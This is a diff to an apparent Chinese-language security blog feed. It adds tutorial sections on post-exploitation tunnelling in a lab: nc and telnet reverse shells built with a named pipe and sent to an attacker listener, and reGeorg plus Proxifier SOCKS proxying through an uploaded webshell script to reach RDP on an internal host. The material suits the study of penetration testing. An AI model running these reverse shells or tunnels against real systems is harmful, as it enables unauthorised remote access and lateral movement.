@@ -38,6 +38,32 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</div></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/tunna4.png" alt=""></p>
 <p>远程连接<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
+<h2 id="Linux系统通过nc反弹shell"><a href="#Linux系统通过nc反弹shell" class="headerlink" title="Linux系统通过nc反弹shell"></a>Linux系统通过nc反弹shell</h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
+<p>首先，攻击端进行监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -lvnp 2333</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
+<p>服务端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.117 2333 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc3.png" alt=""></p>
+<p>执行命令，查看发现反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
+<h2 id="内置命令反弹"><a href="#内置命令反弹" class="headerlink" title="内置命令反弹"></a>内置命令反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -lvnp 2333</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
+<p>服务器端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div><div class="line">telnet 192.168.1.117 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc4.png" alt=""></p>
+<p>反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
+<h2 id="reGeorg-proxifier正向代理"><a href="#reGeorg-proxifier正向代理" class="headerlink" title="reGeorg+proxifier正向代理"></a>reGeorg+proxifier正向代理</h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
+<p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p>
+<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg1.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 8888 -u http://192.168.1.117/tunnel.php</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg2.png" alt=""></p>
+<p>将proxifier打开，在Proxy Server中这样配置<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg22.png" alt=""></p>
+<p>右击“mstsc.exe”，选择“proxifier”-》proxy socks5 127.0.0.1进行远程连接<br><img src="http://xianzhi.aliyun.com/forum/attachment/Mon_1703/4_1369089561206498_634c5121ba88660.jpg" alt=""></p>
+<p>输入内网ip，192.168.1.117</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg4.png" alt=""></p>
+<p>可以看到reGeorg的状态，和proxifier的状态<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg3.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg5.png" alt=""></p>
 ]]></content>
     </entry>
     
